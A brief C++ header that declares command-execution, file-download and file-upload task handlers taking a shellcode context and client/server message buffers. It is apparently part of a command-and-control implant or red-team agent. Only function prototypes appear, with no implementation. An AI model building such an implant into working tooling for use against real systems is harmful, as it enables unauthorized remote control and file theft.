#pragma once

#include "shellcode.hpp"
#include "comms.hpp"
#include "logger.hpp"

DWORD PerformExecTask(sh_context* ctx, client_message* msg_buf, server_response* resp_buf, task_command_data* task_data);

DWORD PerformFileDownloadTask(sh_context* ctx, client_message* msg_buf, server_response* resp_buf);

DWORD PerformFileUploadTask(sh_context* ctx, client_message* msg_buf, server_response* resp_buf, task_start_upload_data* task_data);
